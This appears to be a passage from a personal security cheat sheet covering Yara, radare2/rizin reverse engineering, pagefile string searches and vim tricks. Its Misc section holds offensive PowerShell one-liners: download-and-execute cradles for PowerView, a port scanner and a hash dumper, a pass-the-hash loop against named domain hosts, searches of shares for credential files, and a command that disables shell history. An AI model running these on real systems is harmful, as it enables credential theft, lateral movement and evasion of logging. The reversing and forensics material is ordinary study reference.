Get-ChildItem -Path Registry::HKEY_CURRENT_USER
```

## Yara

Cheatsheet: [https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18dd](https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18dd)

* Meta: descriptive information about the rule
* Strings: define specific strings you want to search in the binaries

Ex:

```yara
rule {
        strings:
                $hello_world = "hello world!"

        condition:
                $hello_world
}
```

*Note*: yara is truthy

* Conditions: true, any of them (any of the variables), <=, >=, !=... Those can be combined with boolean: and, not, or

Generate rules with:

```sh
yarGen.py -m FILE --excludegood -o OUPUT_RULE
```

# Reverse

## Tricks

Print a decimal value in little endian:

```python
import struct
struct.pack('<i', 123456789)
```

Print hexcode into stdin:

```bash
echo -n -e "\x12\x34\x56"
```

## Powershell

```powershell
Get-FileHash -Algorithm MD5 file.exe
strings.exe -accepteula file.exe
Get-Item -Path file.exe -Stream *
wmic process call create $(Resolve-Path file.exe:streamname)
Get-Content -path file.exe -stream streamname
```

## radare2/rizin suite

([Source](https://www.megabeets.net/a-journey-into-radare-2-part-1/) and [also](https://insinuator.net/2016/08/reverse-engineering-with-radare2-intro/))

Get information about the binary:

If you use rizin, use `rz-*`.
```sh
rabin2 -I BIN # general info
rabin2 -i BIN # imports
rabin2 -s BIN # symbols
rabin2 -z BIN # strings
rax2 # used of hex, int and other dataformats
radiff2 # diffing
rahash2 # create hashes from file blocks
rasm2 # play with asm function
```

* by default r2 doesn't analyse the binary, you can do it with `aa` or `aaa`
* (check `aa?` for help and information about the commands) it is also possible to analyse the entire binary straigth away with `r2 -A vuln` or `r2 -c=H vuln` for the webinterface.
* flags are interesting offset of the binary, such as Sections, Functions, Symbols and Strings, you can list them with `fs` and check some of them with `fs <section>` and use `f` to print the flags it contains ex: `fs imports;f`
* to list all functions: `afl`
* to list all imports: `ii`
* `iz` lists strings in data sections and `izz` search for strings in the whole binary
* `axt` stands for analyse x-refs to
* use `s fcn.00501510` and `afn funcname` to rename functions or `afn name fcn.00401510` You can use and address too.
* This command reveals us more of radare2 features. The `axt` command is used to "find data/code references to this address" (see ax?). The special operator @@ is like a foreach iterator sign, used to repeat a command over a list of offsets (see @@?), and `str.*` is a wildcard for all the flags that start with str.. This combination helps us not just to list the strings flags but also to list the function name, where they are used and the referencing instruction. Make sure to select the strings flagspace (default, use `fs *`) before.
* to find a function or go somewhere, you can use `s` (seek). Ex: `s main` (your hex address will change and you will be in the main function)
* to dissassemble: `pdf`. Whole sequence: `s main; pdf`
* to show function arguments: `afa` and variables `afv` to rename a var, `afvn`
  and to set a type: `afvt` to analyse it: `af`
* `V` get to visual mode, `_` for quick search, select a func, var or
  xref: `v`
* `VV` to get the graph disassembler, seek to function: `g<identifier>`
* radare2 is equipped with a very strong and efficient suite of Visual Modes. The Visual Mode is much more user-friendly and takes the reversing experience using r2 to a whole new level. Pressing V will bring us to the Visual Mode screen. Use p/P to change between modes. At the top of the screen you can see the command which was used to generate the view. Navigate to the disassembly view using p. To go back from a specific screen, press q.
* reopen in debug mode: `ood` and `dc` for debug continue
* `dr` to show register and give: `dr rip` for a specific register
* use x/X to list the references to/from (respectively) the current offset. Use the numbers to jump to a reference.
radare2 commands
* use :command to execute r2 commands from inside Visual Mode. This is similar to VIM.
* you can add a comment using ;<comment> followed by Enter, remove it using ;- or even use your default text editor to add the comment using ;!.
* m<key> can be used to mark specific offset with a key of your choice. Press '<key> to go to your key. This helps to mark some key addresses that you’d like to quickly navigate to.


More keybindings:

```
/ # search string
/R # search ROP gadget
/R/ # search ROP gadget with regex


iS # show sections
iS | grep perm=..w # show writable sections
iS | grep perm=..x # show executable sections
ie # list entry points

pdb # show basic block disass
pdf @ [offset|funcname] # disass a function

afi # get function information
afa # show func arguments
afv # show func variables
afvn # rename func variables
afvt # set function variables type
af # add/analyse function

CC! # add comment
CC <text> # append comment
CC. # show comment
CCf # show comment in this function

axt [offset|funcname] | find xref of a function
is~imp. # list libc imports

V # enter visual mode

# in visual mode
v # select function variable, xref
_ <search string> # quicksearch
c # show cursor
d # set function name
; # add comment
;- # remove comment

VV # enter graph mode

p/P # cycle through graph types
g<identifier> # seek function
u # undo seek
' # show comments
/ # add comment
??? # select byteblock
tab # seek to nextyteblock
TAB # seek to previousyteblock

# in conditional branchs
t # to go to True
f # to go to False
```

**PWN Specicic**

```
ragg2 -P SIZE -r # generate cyclical pattern
wop0 $VALUE # find offset at pattern

e search.roplean = 4 # change the deep of the rop search
fd [offset|funcname] # computing how far a symbol is from where you currently
are

i~canary # find canaries
i~pic # for position independant code
i~nc # for non executable stack

aei # initialize emulation
aed # deinitialize emulation
aef # emulate a whole function
aes # single step

pxw [len] [@ offset] # hexdump
?v sym.main # get offset of a symbol
~fcn # to grep for fcn
j # append to get json data: ij, pdfj,  /Rj...

? 0x20 + 0x402a0 # calculus of offsets
```

**Debug**

```
r2 -D gdb -d binary gdb://addr:port
dr= # show registers
dcs* # emulate strace
pd [len] @ eax # disass at register eax
```

r2/rizin has a fork ability to split one proces in various thread (TODO)

[SOURCE](https://radareorg.github.io/blog/posts/using-radare2/)

Some stolen config from [https://gist.github.com/williballenthin/6857590dab3e2a6559d7](https://gist.github.com/williballenthin/6857590dab3e2a6559d7).

In `~/.radare2rc`:

```
# Show comments at right of disassembly if they fit in screen
e asm.cmt.right=true

# Shows pseudocode in disassembly. Eg mov eax, str.ok = > eax = str.ok
e asm.pseudo = true

# Ayu theme
eco ayu

# Use UTF-8 to show cool arrows that do not look like crap :)
e scr.utf8 = true
```


# Custom Scripts

## Strings analisys

List path in a pagefile:

```
strings pagefile.sys | grep -i "^[a-z]:\\\\" | sort | uniq | less
```

Search for env vars:

```
strings pagefile.sys | grep -i "^[a-zA-Z09_]*=.*" | sort -u | uniq | less
```

Search for URLs:

```
strings pagefile.sys | egrep "^https?://" | sort | uniq | less
```

Search for emails:

```
strings pagefile.sys | egrep '([[:alnum:]_.-]{1,64}+@[[:alnum:]_.-]{2,255}+?\.[[:alpha:].]{2,4})'
```

## Aliases

Put them in your `.aliases` file and source it in your `.bashrc` or `.zshrc`.

```sh
alias serve='ruby -run -e httpd . -p 8000'
alias grepip='grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"'
```

## Find all hashes in dir and subdir
    
```
find . -type f -exec sha256sum {} \; | tee sha.out
find . -type f -exec sha512sum {} \; | tee sha.out
find . -type f -exec md5sum {} \; | tee sha.out
```

## Misc

Disable bash history logging:

```sh
unset HISTORYFILE
```

File authorizations in Linux:

```sh
777 rwxrwxrwx No restriction, global WRX any user can do anything.
755 rwxr-xr-x Owner has full access, others can read and execute the file.
700 rwx------ Owner has full access, no one else has access.
666 rw-rw-rw- All users can read and write but not execute.
644 rw-r--r-- Owner can read and write, everyone else can read.
600 rw------- Owner can read and write, everyone else has no access.
```

Runas Powershell:

```powershell
Start-Process powershell.exe -Verb runas Start-Process powershell.exe -Credential <user>
```

View Shares With Permissions:

```powershell
powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');Invoke-ShareFinder -CheckShareAccess"
```

View files that contain certain words recursively:

```powershell
 ls -Path \\SVHOST1.LAZULI.CORP\tmp$ -Include "*pass*","*admin*","*secret*" -Recurse -ErrorAction SilentlyContinue
```

View files which name contains certain words recursively:

```powershell
dir -Path \\SVHOST1.LAZULI.CORP -Include "*pass*","*admin*","*secret*" -Recurse -ErrorAction SilentlyContinue
```

Connect to MSSQL Database:

 ```powershell
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/michaellwest/PowerShell-Modules/master/CorpApps/Invoke-SqlCommand.ps1')

Invoke-SqlCommand -Server 172.11.14.89 -Database master -Username sa -Password  -Query "exec sp_databases"
```

Port Scanning:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')

Invoke-Portscan -Hosts [ip] -TopPorts 50
```

View Domain Controlers

```powershell
nltest /dclist:
```
Get Hashes:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1');Get-PassHashes
```

Check Pass The Hash with multiple servers:

```powershell
$hosts = @("SVDC1.LAZULI.CORP","SVFILES.LAZULI.CORP","SVHOST1.LAZULI.CORP","SVHOST2.LAZULI.CORP","SVFILES2.LAZULI.CORP")

foreach ($h in $hosts){ Invoke-WMIExec -Target $h -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "hostname" -Verbose }
```


## (n)Vim tricks

Remove blank lines:

```
:g/^$/d
```

Remove return carriage:

```
%s/^M//g
```

Replace something:

```
%s/origin/destination/g
```

Sort lines:

```
CTRL-V and select lines or do ggVG
:sort

For invert sort:
:%sort!

For numerical sort:
:sort n
```

Delete duplicated lines:

```
:g/^\(.*\)$\n\1/d
```
    
    
## Grep stuff
    
* -v: see NOT matches
* -o: see ONLY matches


# Sources

## Books

* Red Team Field Manual
* Blue Team Field Manual

## Website

* DFIR Madness
* [Absolom.com](https://www.absolomb.com/)
* [Blog.g0tmi1k.com](https://blog.g0tmi1k.com/)
* [GTFObins](https://gtfobins.github.io/)
* [Hacktrics.xyz](https://book.hacktricks.xyz/)
* [LOLBas](https://lolbas-project.github.io/#)
* [Net Security](https://net-security.fr/security/commandes-gnu-linux-pour-detecter-une-intrusion/)
* [PenstestMonkey](http://pentestmonkey.net/)
* [Pentest Compilation](https://github.com/adon90/pentest_compilation)
* [Red Teaming Experiments](https://ired.team/)
* [Security Ramblings](https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#reconnaissance)
* [TryHackMe](https://tryhackme.com)

## Videos

* [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
* Ib13 something